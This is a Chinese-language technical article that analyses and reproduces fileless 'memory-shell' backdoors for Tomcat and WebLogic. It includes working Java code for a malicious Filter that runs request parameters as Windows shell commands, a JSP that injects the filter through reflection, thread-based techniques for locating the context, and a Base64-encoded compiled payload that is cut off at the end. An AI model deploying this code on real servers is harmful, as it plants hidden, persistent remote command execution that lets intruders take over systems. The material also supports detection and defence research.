# Weblogic内存马分析

## 背景知识

Listener、Filter、Servlet为Java web的三个基础组件，这里简单介绍一下他们的背景

### **Servlet** 

Servlet 是运行在 Web 服务器或应用服务器上的程序，它是作为来自 HTTP 客户端的请求和 HTTP 服务器上的数据库或应用程序之间的中间层。它负责处理用户的请求，并根据请求生成相应的返回信息提供给用户。下面代码是最简单的Servlet，访问/hello的url，服务器将打印hello

```java
package Servlets;

import javax.servlet.*;
import javax.servlet.annotation.WebServlet;
import java.io.IOException;

@WebServlet("/hello")
public class ServletDemo implements  Servlet{

    public void init(ServletConfig servletConfig) throws ServletException {

    }
    public ServletConfig getServletConfig() {
        return null;
    }

    public void service(ServletRequest servletRequest, ServletResponse servletResponse) throws ServletException, IOException {
        System.out.println("hello");

    }
    public String getServletInfo() {
        return null;
    }

    public void destroy() {

    }
}
```



### **Filter**

filter也称之为过滤器，是对Servlet技术的一个强补充，其主要功能是在HttpServletRequest到达 Servlet 之前，拦截客户的HttpServletRequest ，根据需要检查HttpServletRequest，也可以修改HttpServletRequest 头和数据；在HttpServletResponse到达客户端之前，拦截HttpServletResponse ，根据需要检查HttpServletResponse，也可以修改HttpServletResponse头和数据。下面是一个最简单的Filter的例子，在访问/hello资源的时候，过滤器会先拦截请求，可以对请求做出修改，然后再放行，再对拦截响应，可以对响应做出修改，然后再放行。

```java
package Filters;

import javax.servlet.*;
import javax.servlet.annotation.WebFilter;
import java.io.IOException;

@WebFilter("/hello")
public class FilterDemo implements Filter {
    @Override
    public void init(FilterConfig filterConfig) throws ServletException {
        System.out.println("Filter 创建");
    }

    @Override
    public void doFilter(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain) throws IOException, ServletException {
        System.out.println("执行过滤过程");
        filterChain.doFilter(servletRequest, servletResponse);
    }

    @Override
    public void destroy() {
        System.out.println("销毁！");
    }
}
```



### **Listener**

JavaWeb开发中的监听器（Listener）是Application、Session和Request三大对象创建、销毁或者往其中添加、修改、删除属性时自动执行代码的功能组件。可以使用监听器监听客户端的请求、服务端的操作等。通过监听器，可以自动出发一些动作，比如监听在线的用户数量，统计网站访问量、网站访问监控等。因为后续的木马不基于Listener，所以不再给出代码示例。

### java内存马原理

### **概念**

与一句话木马等常见木马不同，内存马不需要有实体文件（但是让内存马启动可能需要实体文件，启动之后可以将实体文件删除），内存马运行起来之后将驻留在内存中，相对来说更隐蔽，危害性更大。

### **内存马可存在的位置**

内存马一般是作为服务器的组件运行在整个服务器中，如java web中常见的组件有Servlet、Filter、Listener这三个，客户端发起的web请求会依次经过Listener、Filter、Servlet三个组件，而内存马可以作为其中一个组件运行在服务器中。只要在内存中修改已有的组件或者动态注册一个新的组件，插入恶意的shellcode，就可以将内存马注入到服务器上。

### **常见的内存马类型**

从内存马存在的形式来看，内存马可以是Listener、Filter、Servlet任意一种类型，在不同的 web服务器中，对这三个组件的具体实现方式也不同，例如在tomcat、weblogic服务器中分别有各自的实现方法， 这也导致动态注册新的组件的方式不同，从这个角度来看，内存马也可以按照服务器或应用程序不同分为tomcat内存马、weblogic内存马等。



## tomcat内存马分析及复现

### **分析**

基于Filter的内存马本质上是在对某些特定的url进行过滤的过程中，去执行恶意代码，恶意代码分为两个部分，第一个部分是Filter中本身的命令执行的java代码，第二部分是攻击者通过http请求发过来的参数（即c参数对应的部分）

```java
package com.evalshell.Filter;

import javax.servlet.*;
import javax.servlet.annotation.WebFilter;
import javax.servlet.http.HttpServletRequest;
import java.io.IOException;
import java.io.InputStream;
import java.util.Scanner;

@WebFilter("/hello")
public class EvilFilter implements Filter {
    @Override
    public void init(FilterConfig filterConfig) throws ServletException {
        System.out.println("evil Filter 创建");
    }

    @Override
    public void doFilter(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain) throws IOException, ServletException {
        System.out.println("evil filter 执行过滤过程");
        //测试在windows环境下
        HttpServletRequest request = (HttpServletRequest) servletRequest;
        if (request.getParameter("c") != null){
            StringBuilder command=new StringBuilder("cmd /c ");
            command.append(request.getParameter("c"));
            InputStream inputStream = Runtime.getRuntime().exec(command.toString()).getInputStream();
            Scanner scanner = new Scanner(inputStream).useDelimiter("\\a");
            String output = scanner.hasNext() ? scanner.next() : "";
            servletResponse.getWriter().write(output);
            servletResponse.getWriter().flush();
            return;
        }

        filterChain.doFilter(servletRequest, servletResponse);
    }

    @Override
    public void destroy() {
        System.out.println("销毁！");
    }
}
```

![image-20230629173325276](./images/1.png)



攻击者如果能在服务器启动之后动态注册一个Filter，并且Filter的功能与以上代码相同，那么就成功注入了内存马。

要注册Filter，首先要分析Filter是如何注册的，以下是Filter的调用链

![图片](./images/2.png)

通过对weblogic的Filter注册过程的分析，要注册一个Filter类型的内存马，需要以下几个步骤

1. 首先创建一个恶意Filter
2. 利用 FilterDef 对 Filter 进行一个封装
3. 将 FilterDef 添加到 FilterDefs 和 FilterConfig
4. 创建 FilterMap ，将我们的 Filter 和 urlpattern 相对应，存放到 filterMaps中（由于 Filter 生效会有一个先后顺序，所以我们一般都是放在最前面，让恶意的 Filter 最先触发）

### **复现**

#### 遇到的问题

在IDEA中启动tomcat并运行java web服务器代码，有两种方式：

1. 通过配置本地的tomcat服务器启动
2. 通过使用tomcat-maven插件启动，通过插件相对来说更简单，一般简单的开发和测试可以通过这种方式

在实际复现的过程中，如果通过插件启动，由于插件中的tomcat版本等问题，jsp页面上会发生某些包无法导入的情况（在jsp页面中写代码时，无法导入某些包，不是在服务器上写java文件代码时包无法导入）。

这种情况只能改用本地tomcat启动，这样可以解决tomcat相关包无法导入的问题。

#### **执行恶意JSP代码**

要对服务器注入内存马，前置条件一般是服务器存在文件上传漏洞或者反序列化漏洞，在服务器存在文件上传漏洞时，可以将恶意代码写在JSP文件中，然后将JSP文件上传到服务器，再访问该JSP文件，服务器就会执行JSP中的恶意代码，综合以上的分析，最终恶意代码如下（本质上是三个步骤，通过匿名内部类注册一个Filter的对象，通过反射获取到运行时的StandardContext，并通过反射注册这个Filter对象）：

```java
<%@ page import="org.apache.catalina.core.ApplicationContext" %>
<%@ page import="java.lang.reflect.Field" %>
<%@ page import="org.apache.catalina.core.StandardContext" %>
<%@ page import="java.util.Map" %>
<%@ page import="java.io.IOException" %>
<%@ page import="org.apache.tomcat.util.descriptor.web.FilterDef" %>
<%@ page import="org.apache.tomcat.util.descriptor.web.FilterMap" %>
<%@ page import="java.lang.reflect.Constructor" %>
<%@ page import="org.apache.catalina.core.ApplicationFilterConfig" %>
<%@ page import="org.apache.catalina.Context" %>

<%@ page language="java" contentType="text/html; charset=UTF-8" pageEncoding="UTF-8"%>

<%
    final String name = "fengxuan";
    ServletContext servletContext = request.getSession().getServletContext();

    Field appctx = servletContext.getClass().getDeclaredField("context");
    appctx.setAccessible(true);
    ApplicationContext applicationContext = (ApplicationContext) appctx.get(servletContext);

    Field stdctx = applicationContext.getClass().getDeclaredField("context");
    stdctx.setAccessible(true);
    StandardContext standardContext = (StandardContext) stdctx.get(applicationContext);

    Field Configs = standardContext.getClass().getDeclaredField("filterConfigs");
    Configs.setAccessible(true);
    Map filterConfigs = (Map) Configs.get(standardContext);

    if (filterConfigs.get(name) == null){
        Filter filter = new Filter() {
            @Override
            public void init(FilterConfig filterConfig) throws ServletException {

            }

            @Override
            public void doFilter(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain) throws IOException, ServletException {
                //这里写上我们后门的主要代码
                HttpServletRequest req = (HttpServletRequest) servletRequest;
                if (req.getParameter("cmd") != null){
                    byte[] bytes = new byte[1024];

                    StringBuilder CmdStr = new StringBuilder();
                    CmdStr.append("cmd /c ");
                    CmdStr.append(req.getParameter("cmd"));
                    Process WinProcess=Runtime.getRuntime().exec(CmdStr.toString());
                    int len = WinProcess.getInputStream().read(bytes);
                    servletResponse.getWriter().write(new String(bytes,0,len));
                    WinProcess.destroy();
                    return;


                }
                //放行请求，不然的话其他的过滤器可能无法使用
                filterChain.doFilter(servletRequest,servletResponse);
            }

            @Override
            public void destroy() {

            }

        };


        FilterDef filterDef = new FilterDef();
        filterDef.setFilter(filter);
        filterDef.setFilterName(name);
        filterDef.setFilterClass(filter.getClass().getName());

        // 将filterDef添加到filterDefs中
        standardContext.addFilterDef(filterDef);

        FilterMap filterMap = new FilterMap();
      //拦截的路由规则，/* 表示拦截任意路由
        filterMap.addURLPattern("/*");
        filterMap.setFilterName(name);
        filterMap.setDispatcher(DispatcherType.REQUEST.name());

        standardContext.addFilterMapBefore(filterMap);

        Constructor constructor = ApplicationFilterConfig.class.getDeclaredConstructor(Context.class,FilterDef.class);
        constructor.setAccessible(true);
        ApplicationFilterConfig filterConfig = (ApplicationFilterConfig) constructor.newInstance(standardContext,filterDef);

        filterConfigs.put(name,filterConfig);
        out.print("注入成功");
    }
%>
```

访问该JSP页面

![image-20230629175815542](./images/3.png)

由于该Filter拦截所有路由，任意输入url，并附带参数cmd=dir，可以看到命令被执行

![image-20230629180426526](./images/4.png)

## weblogic内存马分析及复现

### **分析**

创建一个Filter，随便打一个断点，观察此时的堆栈信息
![img](./650)

通过跟踪堆栈信息，我们可以找到，在wrapRun函数中，会判断系统中是否存在filter以及listener。如果存在，则获取FilterChain，然后依次调用Filter。原理与tomcat类似。相关代码如下

```java
weblogic.servlet.internal.WebAppServletContext.ServletInvocationAction#wrapRun 函数

if (!invocationContext.hasFilters() && !invocationContext.hasRequestListeners()) {
    this.stub.execute(this.req, this.rsp);
} else {
    FilterChainImpl fc = invocationContext.getFilterChain(this.stub, this.req, this.rsp);
    if (fc == null) {
        this.stub.execute(this.req, this.rsp);
    } else {
        fc.doFilter(this.req, this.rsp);
    }
}

```

而getFilterChain的代码在 weblogic.servlet.internal.FilterManager中。weblogic中主要使用FilterManager去管理系统中的Filter，包括动态注册一个Filter，获取FilterChain等。动态注册一个Filter的代码如下

```java
    void registerFilter(String filterName, String filterClassName, String[] urlPatterns, String[] servletNames, Map initParams, String[] dispatchers) throws DeploymentException {
        FilterWrapper fw = new FilterWrapper(filterName, filterClassName, initParams, this.context);
        if (this.loadFilter(fw)) {
            EnumSet<DispatcherType> types = FilterManager.FilterInfo.translateDispatcherType(dispatchers, this.context, filterName);
            if (urlPatterns != null) {
                this.addMappingForUrlPatterns(filterName, types, true, urlPatterns);
            }

            if (servletNames != null) {
                this.addMappingForServletNames(filterName, types, true, servletNames);
            }

            this.filters.put(filterName, fw);
        }
    }
```

技术难点主要有以下两点：

1. 怎么寻找FilterManager
2. weblogic中类加载器机制

#### **1. 寻找FilterManager**

weblogic中，context会存放FilterManager。所以，这个问题转换为如何获取context。有两种方法

**pageContext**

jsp页面中的pageContext对象中，存有context对象。可以通过反射获取。这种比较适合直接上传jsp文件获取webshell权限的情况。代码如下

```java
        Field contextF = pageContext.getClass().getDeclaredField("context");
        contextF.setAccessible(true);
        Object context = contextF.get(pageContext);
```

**线程中**

这种情况比较适合shiro，T3等反序列化漏洞，在无法上传文件，但是可以直接通过反序列化获取weblogic权限的情况。这种情况下不需要pageContext对象，在线程中查找context对象。代码如下

```
        Class<?> executeThread = Class.forName("weblogic.work.ExecuteThread");
        Method m = executeThread.getDeclaredMethod("getCurrentWork");
        Object currentWork = m.invoke(Thread.currentThread());

        Field connectionHandlerF = currentWork.getClass().getDeclaredField("connectionHandler");
        connectionHandlerF.setAccessible(true);
        Object obj = connectionHandlerF.get(currentWork);

        Field requestF = obj.getClass().getDeclaredField("request");
        requestF.setAccessible(true);
        obj = requestF.get(obj);

        Field contextF = obj.getClass().getDeclaredField("context");
        contextF.setAccessible(true);
        Object context = contextF.get(obj);
```

#### 2.FilterWrapper中类加载器机制

这里只针对于加载Filter的情况去讨论。在FilterManager的registerFilter方法中，主要通过FilterWrapper类去包装Filter类。但是FilterWrapper类的构造函数中，并没有可以传递Class的参数，只可以传递ClassName，FilterManager通过ClassName去查找Class。下面我们分析一下实现过程

在FilterManager的loadFilter中，Filter将会在这里实例化。代码如下

```java
weblogic.servlet.internal.FilterManager#loadFilter
boolean loadFilter(FilterWrapper filterWrapper) {
        String filterClassName = filterWrapper.getFilterClassName();
        filter = (Filter)this.context.createInstance(filterClassName);
        filterWrapper.setFilter((String)null, (Class)null, filter, false);
        }
```

在filterWrapper.getFilterClassName中获取FilterClass的名称，然后通过context的createInstance方法去实例化。下面是createInstance的代码

```java
Object createInstance(String className) throws ClassNotFoundException, InstantiationException, IllegalAccessException {
    Class<?> clazz = this.classLoader.loadClass(className);
    return this.createInstance(clazz);
}
```

在这里通过调用classloader的loadClass方法去根据名称查找Class。我们知道weblogic自定义了一个classloader，所以我们继续深入loadCLass方法，代码如下

```java
weblogic.utils.classloaders.ChangeAwareClassLoader#loadClass(java.lang.String, boolean)
protected Class<?> loadClass(String name, boolean resolve) throws ClassNotFoundException {
    synchronized(this.getClassLoadingLock(name)) {
        Class res = (Class)this.cachedClasses.get(name);
        if (res != null) {
            return res;
        } else if (!this.childFirst) {
            return super.loadClass(name, resolve);

```

我们可以看出，ChangeAwareClassLoader会首先从cache中查找是否存在待查找的类，如果存在，则直接返回该名称对应的Class。
所以我们为了使自己待动态加载的Filter可以被FilterManager成功查找，最简单的方法是在这个缓存中动手脚，将恶意类插入到缓存中

### **复现**

#### 遇到的问题

将代码部署到weblogic有两种方式，第一种常规的方式是把java web的项目打包成war包，然后通过weblogic页面选择并部署，第二种方式可以在IDEA中集成weblogic环境，通过配置插件可以很方便的直接部署并启动，但是这样需要ultimate 版本的IDEA才能下载weblogic的插件



之前在网上查找的所有payload的执行之后，都在 Field request1 = http.getClass().getDeclaredField("request");处报错，提示没有request这个对象，一开始以为是代码方面的问题，排查之后发现是weblogic 版本的问题，最新版weblogic14的调用链与之前不同，安装了weblogic12c之后，恶意代码可以执行

#### 执行恶意JSP代码

创建恶意的Filter代码如下：

```java
package Filters;

import javax.servlet.*;
import javax.servlet.annotation.WebFilter;
import javax.servlet.http.HttpServletRequest;
import java.io.IOException;
import java.io.InputStream;
import java.util.Scanner;



//@WebFilter("/hello")
public class EvilFilter implements Filter {
    @Override
    public void init(FilterConfig filterConfig) throws ServletException {
        System.out.println("evil Filter 创建");
    }

    @Override
    public void doFilter(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain) throws IOException, ServletException {
        System.out.println("evil filter 执行过滤过程");
        //windows环境下
        HttpServletRequest request = (HttpServletRequest) servletRequest;
        if (request.getParameter("c") != null){
            StringBuilder command=new StringBuilder("cmd /c ");
            command.append(request.getParameter("c"));
            InputStream inputStream = Runtime.getRuntime().exec(command.toString()).getInputStream();
            Scanner scanner = new Scanner(inputStream).useDelimiter("\\a");
            String output = scanner.hasNext() ? scanner.next() : "";
            servletResponse.getWriter().write(output);
            servletResponse.getWriter().flush();
            return;
        }

        filterChain.doFilter(servletRequest, servletResponse);
    }

    @Override
    public void destroy() {
        System.out.println("evil filter 销毁！");
    }
}

```

将Filter.java编译为Filter.class，然后通过以下代码对其进行Base64编码

```
import sun.misc.BASE64Encoder;

import java.io.ByteArrayOutputStream;
import java.io.File;
import java.io.FileInputStream;

public class compress {
    public static void main(String[] args) {
        try{
            File directory = new File("");//设定为当前文件夹

            try{

                System.out.println(directory.getCanonicalPath());//获取标准的路径

                System.out.println(directory.getAbsolutePath());//获取绝对路径

            }catch(Exception e){}

            File file = new File("./EvilFilter.class");
            FileInputStream fileInputStream = new FileInputStream(file);
            ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
            byte[] bytes = new byte[4096];
            int len;
            while ((len = fileInputStream.read(bytes))!=-1){
                byteArrayOutputStream.write(bytes,0,len);
            }
            String encode = new BASE64Encoder().encode(byteArrayOutputStream.toByteArray());
            System.out.println(encode.replaceAll("\\r|\\n",""));
        }catch (Exception e){
            e.printStackTrace();
        }
    }
}

```

编码的结果为

```
yv66vgAAADIAmgoAHgBNCQBOAE8IAFAKAFEAUggAUwcAVAgAVQsABgBWBwBXCABYCgAJAFkKAAkAWgoAWwBcCgAJAF0KAFsAXgoAXwBgBwBhCgARAGIIAGMKABEAZAoAEQBlCgARAGYIAGcLAGgAaQoAagBrCgBqAGwLAG0AbggAbwcAcAcAcQcAcgEABjxpbml0PgEAAygpVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBABJMb2NhbFZhcmlhYmxlVGFibGUBAAR0aGlzAQAUTEZpbHRlcnMvRXZpbEZpbHRlcjsBAARpbml0AQAfKExqYXZheC9zZXJ2bGV0L0ZpbHRlckNvbmZpZzspVgEADGZpbHRlckNvbmZpZwEAHExqYXZheC9zZXJ2bGV0L0ZpbHRlckNvbmZpZzsBAApFeGNlcHRpb25zBwBzAQAIZG9GaWx0ZXIBAFsoTGphdmF4L3NlcnZsZXQvU2VydmxldFJlcXVlc3Q7TGphdmF4L3NlcnZsZXQvU2VydmxldFJlc3BvbnNlO0xqYXZheC9zZXJ2bGV0L0ZpbHRlckNoYWluOylWAQAHY29tbWFuZAEAGUxqYXZhL2xhbmcvU3RyaW5nQnVpbGRlcjsBAAtpbnB1dFN0cmVhbQEAFUxqYXZhL2lvL0lucHV0U3RyZWFtOwEAB3NjYW5uZXIBABNMamF2YS91dGlsL1NjYW5uZXI7AQAGb3V0cHV0AQASTGphdmEvbGFuZy9TdHJpbmc7AQAOc2VydmxldFJlcXVlc3QBAB5MamF2YXgvc2VydmxldC9TZXJ2bGV0UmVxdWVzdDsBAA9zZXJ2bGV0UmVzcG9uc2UBAB9MamF2YXgvc2VydmxldC9TZXJ2bGV0UmVzcG9uc2U7AQALZmlsdGVyQ2hhaW4BABtMamF2YXgvc2VydmxldC9GaWx0ZXJDaGFpbjsBAAdyZXF1ZXN0AQAnTGphdmF4L3NlcnZsZXQvaHR0cC9IdHRwU2VydmxldFJlcXVlc3Q7AQANU3RhY2tNYXBUYWJsZQcAcAcAdAcAdQcAdgcAVAcAVwcAdwcAYQcAeAcAeQEAB2Rlc3Ryb3kBAApTb3VyY2VGaWxlAQAPRXZpbEZpbHRlci5qYXZhDAAgACEHAHoMAHsAfAEAEmV2aWwgRmlsdGVyIOWIm+W7ugcAfQwAfgB/AQAeZXZpbCBmaWx0ZXIg5omn6KGM6L+H5ruk6L+H56iLAQAlamF2YXgvc2VydmxldC9odHRwL0h0dHBTZXJ2bGV0UmVxdWVzdAEAAWMMAIAAgQEAF2phdmEvbGFuZy9TdHJpbmdCdWlsZGVyAQAHY21kIC9jIAwAIAB/DACCAIMHAIQMAIUAhgwAhwCIDACJAIoHAIsMAIwAjQEAEWphdmEvdXRpbC9TY2FubmVyDAAgAI4BAAJcYQwAjwCQDACRAJIMAJMAiAEAAAcAdQwAlACVBwCWDACXAH8MAJgAIQcAdgwALQCZAQAVZXZpbCBmaWx0ZXIg6ZSA5q+B77yBAQASRmlsdGVycy9FdmlsRmlsdGVyAQAQamF2YS9sYW5nL09iamVjdAEAFGphdmF4L3NlcnZsZXQvRmlsdGVyAQAeamF2YXgvc2VydmxldC9TZXJ2bGV0RXhjZXB0aW9uAQAcamF2YXgvc2VydmxldC9TZXJ2bGV0UmVxdWVzdAEAHWphdmF4L3NlcnZsZXQvU2VydmxldFJlc3BvbnNlAQAZamF2YXgvc2VydmxldC9GaWx0ZXJDaGFpbgEAE2phdmEvaW8vSW5wdXRTdHJlYW0BABBqYXZhL2xhbmcvU3RyaW5nAQATamF2YS9pby9JT0V4Y2VwdGlvbgEAEGphdmEvbGFuZy9TeXN0ZW0BAANvdXQBABVMamF2YS9pby9QcmludFN0cmVhbTsBABNqYXZhL2lvL1ByaW50U3RyZWFtAQAHcHJpbnRsbgEAFShMamF2YS9sYW5nL1N0cmluZzspVgEADGdldFBhcmFtZXRlcgEAJihMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9TdHJpbmc7AQAGYXBwZW5kAQAtKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1N0cmluZ0J1aWxkZXI7AQARamF2YS9sYW5nL1J1bnRpbWUBAApnZXRSdW50aW1lAQAVKClMamF2YS9sYW5nL1J1bnRpbWU7AQAIdG9TdHJpbmcBABQoKUxqYXZhL2xhbmcvU3RyaW5nOwEABGV4ZWMBACcoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvUHJvY2VzczsBABFqYXZhL2xhbmcvUHJvY2VzcwEADmdldElucHV0U3RyZWFtAQAXKClMamF2YS9pby9JbnB1dFN0cmVhbTsBABgoTGphdmEvaW8vSW5wdXRTdHJlYW07KVYBAAx1c2VEZWxpbWl0ZXIBACcoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL3V0aWwvU2Nhbm5lcjsBAAdoYXNOZXh0AQADKClaAQAEbmV4dAEACWdldFdyaXRlcgEAFygpTGphdmEvaW8vUHJpbnRXcml0ZXI7AQATamF2YS9pby9QcmludFdyaXRlcgEABXdyaXRlAQAFZmx1c2gBAEAoTGphdmF4L3NlcnZsZXQvU2VydmxldFJlcXVlc3Q7TGphdmF4L3NlcnZsZXQvU2VydmxldFJlc3BvbnNlOylWACEAHQAeAAEAHwAAAAQAAQAgACEAAQAiAAAALwABAAEAAAAFKrcAAbEAAAACACMAAAAGAAEAAAANACQAAAAMAAEAAAAFACUAJgAAAAEAJwAoAAIAIgAAAEEAAgACAAAACbIAAhIDtgAEsQAAAAIAIwAAAAoAAgAAABAACAARACQAAAAWAAIAAAAJACUAJgAAAAAACQApACoAAQArAAAABAABACwAAQAtAC4AAgAiAAABXgADAAkAAACGsgACEgW2AAQrwAAGOgQZBBIHuQAIAgDGAGa7AAlZEgq3AAs6BRkFGQQSB7kACAIAtgAMV7gADRkFtgAOtgAPtgAQOga7ABFZGQa3ABISE7YAFDoHGQe2ABWZAAsZB7YAFqcABRIXOggsuQAYAQAZCLYAGSy5ABgBALYAGrEtKyy5ABsDALEAAAADACMAAAA2AA0AAAAVAAgAFwAOABgAGgAZACUAGgA0ABsARAAcAFQAHQBoAB4AcwAfAHwAIAB9ACMAhQAkACQAAABcAAkAJQBYAC8AMAAFAEQAOQAxADIABgBUACkAMwA0AAcAaAAVADUANgAIAAAAhgAlACYAAAAAAIYANwA4AAEAAACGADkAOgACAAAAhgA7ADwAAwAOAHgAPQA+AAQAPwAAACgAA/8AZAAIBwBABwBBBwBCBwBDBwBEBwBFBwBGBwBHAABBBwBI+AAWACsAAAAGAAIASQAsAAEASgAhAAEAIgAAADcAAgABAAAACbIAAhIctgAEsQAAAAIAIwAAAAoAAgAAACgACAApACQAAAAMAAEAAAAJACUAJgAAAAEASwAAAAIATA==
```

创建evil.jsp，恶意代码为，主要思路是将恶意Filter对象的Base64编码结果加载到缓存cachedClasses中，这样通过filterManager就可以直接注册该恶意Filter对象

```java
<%--
  Created by IntelliJ IDEA.
  User: Jack
  Date: 6/29/2023
  Time: 1:40 PM
  To change this template use File | Settings | File Templates.
--%>
<%@ page import="sun.misc.BASE64Decoder" %>
<%@ page import="weblogic.servlet.internal.FilterManager" %>
<%@ page import="weblogic.servlet.internal.ServletRequestImpl" %>
<%@ page import="weblogic.servlet.internal.WebAppServletContext" %>
<%@ page import="javax.servlet.ServletException" %>
<%@ page import="javax.servlet.annotation.WebServlet" %>
<%@ page import="javax.servlet.http.HttpServlet" %>
<%@ page import="javax.servlet.http.HttpServletRequest" %>
<%@ page import="javax.servlet.http.HttpServletResponse" %>
<%@ page import="java.io.IOException" %>
<%@ page import="java.lang.reflect.Field" %>
<%@ page import="java.lang.reflect.InvocationTargetException" %>
<%@ page import="java.lang.reflect.Method" %>
<%@ page import="java.util.Map" %>

<%@ page contentType="text/html;charset=UTF-8" language="java" %>

<%

    response.getWriter().write("test!!!");
    Thread thread = Thread.currentThread();
    try {
    Field workEntry = Class.forName("weblogic.work.ExecuteThread").getDeclaredField("workEntry");
    workEntry.setAccessible(true);
    Object workentry  = workEntry.get(thread);

    Field connectionHandler = workentry.getClass().getDeclaredField("connectionHandler");
    connectionHandler.setAccessible(true);
    Object http = connectionHandler.get(workentry);

    Field request1 = http.getClass().getDeclaredField("request");
    request1.setAccessible(true);
    ServletRequestImpl servletRequest = (ServletRequestImpl)request1.get(http);

    response.getWriter().write("Success!!!");
    Field context = servletRequest.getClass().getDeclaredField("context");
    context.setAccessible(true);
    WebAppServletContext webAppServletContext = (WebAppServletContext)context.get(servletRequest);

    String encode_class ="yv66vgAAADIAmgoAHgBNCQBOAE8IAFAKAFEAUggAUwcAVAgAVQsABgBWBwBXCABYCgAJAFkKAAkAWgoAWwBcCgAJAF0KAFsAXgoAXwBgBwBhCgARAGIIAGMKABEAZAoAEQBlCgARAGYIAGcLAGgAaQoAagBrCgBqAGwLAG0AbggAbwcAcAcAcQcAcgEABjxpbml0PgEAAygpVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBABJMb2NhbFZhcmlhYmxlVGFibGUBAAR0aGlzAQAUTEZpbHRlcnMvRXZpbEZpbHRlcjsBAARpbml0AQAfKExqYXZheC9zZXJ2bGV0L0ZpbHRlckNvbmZpZzspVgEADGZpbHRlckNvbmZpZwEAHExqYXZheC9zZXJ2bGV0L0ZpbHRlckNvbmZpZzsBAApFeGNlcHRpb25zBwBzAQAIZG9GaWx0ZXIBAFsoTGphdmF4L3NlcnZsZXQvU2VydmxldFJlcXVlc3Q7TGphdmF4L3NlcnZsZXQvU2VydmxldFJlc3BvbnNlO0xqYXZheC9zZXJ2bGV0L0ZpbHRlckNoYWluOylWAQAHY29tbWFuZAEAGUxqYXZhL2xhbmcvU3RyaW5nQnVpbGRlcjsBAAtpbnB1dFN0cmVhbQEAFUxqYXZhL2lvL0lucHV0U3RyZWFtOwEAB3NjYW5uZXIBABNMamF2YS91dGlsL1NjYW5uZXI7AQAGb3V0cHV0AQASTGphdmEvbGFuZy9TdHJpbmc7AQAOc2VydmxldFJlcXVlc3QBAB5MamF2YXgvc2VydmxldC9TZXJ2bGV0UmVxdWVzdDsBAA9zZXJ2bGV0UmVzcG9uc2UBAB9MamF2YXgvc2VydmxldC9TZXJ2bGV0UmVzcG9uc2U7AQALZmlsdGVyQ2hhaW4BABtMamF2YXgvc2VydmxldC9GaWx0ZXJDaGFpbjsBAAdyZXF1ZXN0AQAnTGphdmF4L3NlcnZsZXQvaHR0cC9IdHRwU2VydmxldFJlcXVlc3Q7AQANU3RhY2tNYXBUYWJsZQcAcAcAdAcAdQcAdgcAVAcAVwcAdwcAYQcAeAcAeQEAB2Rlc3Ryb3kBAApTb3VyY2VGaWxlAQAPRXZpbEZpbHRlci5qYXZhDAAgACEHAHoMAHsAfAEAEmV2aWwgRmlsdGVyIOWIm+W7ugcAfQwAfgB/AQAeZXZpbCBmaWx0ZXIg5omn6KGM6L+H5ruk6L+H56iLAQAlamF2YXgvc2VydmxldC9odHRwL0h0dHBTZXJ2bGV0UmVxdWVzdAEAAWMMAIAAgQEAF2phdmEvbGFuZy9TdHJpbmdCdWlsZGVyAQAHY21kIC9jIAwAIAB/DACCAIMHAIQMAIUAhgwAhwCIDACJAIoHAIsMAIwAjQEAEWphdmEvdXRpbC9TY2FubmVyDAAgAI4BAAJcYQwAjwCQDACRAJIMAJMAiAEAAAcAdQwAlACVBwCWDACXAH8MAJgAIQcAdgwALQCZAQAVZXZpbCBmaWx0ZXIg6ZSA5q+B77yBAQASRmlsdGVycy9FdmlsRmlsdGVyAQAQamF2YS9sYW5nL09iamVjdAEAFGphdmF4L3NlcnZsZXQvRmlsdGVyAQAeamF2YXgvc2VydmxldC9TZXJ2bGV0RXhjZXB0aW9uAQAcamF2YXgvc2VydmxldC9TZXJ2bGV0UmVxdWVzdAEAHWphdmF4L3NlcnZsZXQvU2VydmxldFJlc3BvbnNlAQAZamF2YXgvc2VydmxldC9GaWx0ZXJDaGFpbgEAE2phdmEvaW8vSW5wdXRTdHJlYW0BABBqYXZhL2xhbmcvU3RyaW5nAQATamF2YS9pby9JT0V4Y2VwdGlvbgEAEGphdmEvbGFuZy9TeXN0ZW0BAANvdXQBABVMamF2YS9pby9QcmludFN0cmVhbTsBABNqYXZhL2lvL1ByaW50U3RyZWFtAQAHcHJpbnRsbgEAFShMamF2YS9sYW5nL1N0cmluZzspVgEADGdldFBhcmFtZXRlcgEAJihMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9TdHJpbmc7AQAGYXBwZW5kAQAtKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1N0cmluZ0J1aWxkZXI7AQARamF2YS9sYW5nL1J1bnRpbWUBAApnZXRSdW50aW1lAQAVKClMamF2YS9sYW5nL1J1bnRpbWU7AQAIdG9TdHJpbmcBABQoKUxqYXZhL2xhbmcvU3RyaW5nOwEABGV4ZWMBACcoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvUHJvY2VzczsBABFqYXZhL2xhbmcvUHJvY2VzcwEADmdldElucHV0U3RyZWFtAQAXKClMamF2YS9pby9JbnB1dFN0cmVhbTsBABgoTGphdmEvaW8vSW5wdXRTdHJlYW07KVYBAAx1c2VEZWxpbWl0ZXIBACcoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL3V0aWwvU2Nhbm5lcjsBAAdoYXNOZXh0AQADKClaAQAEbmV4dAEACWdldFdyaXRlcgEAFygpTGphdmEvaW8vUHJpbnRXcml0ZXI7AQATamF2YS9pby9QcmludFdyaXRlcgEABXdyaXRlAQAFZmx1c2gBAEAoTGphdmF4L3NlcnZsZXQvU2VydmxldFJlcXVlc3Q7TGphdmF4L3NlcnZsZXQvU2VydmxldFJlc3BvbnNlOylWACEAHQAeAAEAHwAAAAQAAQAgACEAAQAiAAAALwABAAEAAAAFKrcAAbEAAAACACMAAAAGAAEAAAANACQAAAAMAAEAAAAFACUAJgAAAAEAJwAoAAIAIgAAAEEAAgACAAAACbIAAhIDtgAEsQAAAAIAIwAA